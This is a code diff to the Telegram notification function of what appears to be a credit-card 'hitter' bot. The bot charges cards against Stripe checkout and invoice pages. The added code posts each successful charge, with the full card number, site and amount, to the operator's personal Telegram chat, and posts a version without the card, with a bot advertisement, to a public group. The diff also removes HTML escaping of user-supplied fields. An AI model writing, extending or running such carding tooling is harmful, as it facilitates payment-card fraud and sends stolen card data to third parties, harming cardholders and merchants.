@@ -389,49 +389,66 @@ function escapeHTML(str) {
 }
 
 async function sendHitNotification(res, gate, userPlan, userName, site, amount, card) {
-    const NOTIFY_BOT_TOKEN = config.NOTIFY_BOT_TOKEN;
-    const CHAT_ID = config.NOTIFY_CHAT_ID;
+    const LOG_BOT_TOKEN = config.NOTIFY_BOT_TOKEN; // Roket Hitt for personal log
+    const MAIN_BOT_TOKEN = config.MAIN_BOT_TOKEN; // @autohittrobot for group public message
+    const PERSONAL_ID = config.PERSONAL_CHAT_ID;
+    const GROUP_ID = config.GROUP_CHAT_ID;
 
-    const gatewayMap = {
-        'checkout': 'Stripe Checkout Hitter',
-        'invoice': 'Stripe Invoice Hitter',
-        'billing': 'Stripe Billing Hitter'
-    };
-    const gateway = gatewayMap[gate] || 'Stripe Hitter';
+    const gatewayName = gate === 'checkout' ? 'Stripe Checkout Hitter' : (gate === 'invoice' ? 'Stripe Invoice Hitter' : 'Stripe Hitter');
 
-    const message = `
+    // Message for Personal Log (Shows everything)
+    const personalMsg = `
 🔥 <b>HIT DETECTED</b> ⚡
-👤 <b>User</b>: <code>${escapeHTML(userName) || 'User'}</code>
-👤 <b>Plan</b>: ${escapeHTML(userPlan.toUpperCase())}
-💳 <b>Card</b>: <code>${escapeHTML(card) || 'Unknown'}</code>
-↔️ <b>Gateway</b>: ${escapeHTML(gateway)}
+👤 <b>User</b>: <code>${userName}</code> 🇧🇩 🇵🇸 🇮🇷 🇵🇰
+🆙 <b>Plan</b>: ${userPlan.toUpperCase()}
+💳 <b>Card</b>: <code>${card}</code>
+↔️ <b>Gateway</b>: ${gatewayName}
 ✅ <b>Response</b>: Charged Successfully
-🌐 <b>Site</b>: ${escapeHTML(site) || 'Stripe Checkout'}
-💰 <b>Amount</b>: ${escapeHTML(amount) || 'Unknown'}
+🌐 <b>Site</b>: ${site}
+💰 <b>Amount</b>: ${amount}
 `.trim();
 
-    try {
-        console.log(`[Notification] Sending hit to ${CHAT_ID}...`);
-        const response = await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: message,
-            parse_mode: 'HTML',
-            disable_web_page_preview: true
-        });
-        console.log(`[Notification] SUCCESS sent to ${CHAT_ID}`);
-    } catch (err) {
-        // Fallback: If HTML fails (due to tags/characters), try sending as Plain Text
+    // Message for Group (Masked Card, Ads)
+    const groupMsg = `
+🚀 <b>HIT SUCCESSFUL</b> ⚡
+👤 <b>User</b>: <code>${userName}</code> 🇧🇩
+🆙 <b>Plan</b>: ${userPlan.toUpperCase()}
+↔️ <b>Gateway</b>: ${gatewayName}
+✅ <b>Response</b>: Charged Successfully
+🌐 <b>Site</b>: ${site}
+💰 <b>Amount</b>: ${amount}
+
+<i>Checked by @autohittrobot ✅</i>
+`.trim();
+
+    // 1. Send Full Log to Personal ID (Bot: Roket Hitt)
+    if (PERSONAL_ID) {
         try {
-            console.warn(`[Notification] HTML failed, trying Plain Text...`);
-            const plainMsg = message.replace(/<[^>]*>/g, ''); // Remove HTML tags
-            await axios.post(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
-                chat_id: CHAT_ID,
-                text: `🔥 HIT DETECTED 🔥\n\n${plainMsg}`
+            await axios.post(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
+                chat_id: PERSONAL_ID,
+                text: personalMsg,
+                parse_mode: 'HTML'
             });
-            console.log(`[Notification] SUCCESS sent (Plain Text) to ${CHAT_ID}`);
-        } catch (e) {
-            console.error(`[Notification] CRITICAL: Both HTML and Plain Text failed for ${CHAT_ID}`);
-            if (err.response) console.error('[Telegram Details]:', err.response.data);
+        } catch (err) {
+            console.error('[Notification] Personal Log Error:', err.message);
+        }
+    }
+
+    // 2. Send Clean Log to Group (Bot: @autohittrobot)
+    if (GROUP_ID) {
+        try {
+            await axios.post(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
+                chat_id: GROUP_ID,
+                text: groupMsg,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [[
+                        { text: '🚀 Open Bot', url: 'https://t.me/autohittrobot' }
+                    ]]
+                }
+            });
+        } catch (err) {
+            console.error('[Notification] Group Log Error:', err.message);
         }
     }
 }
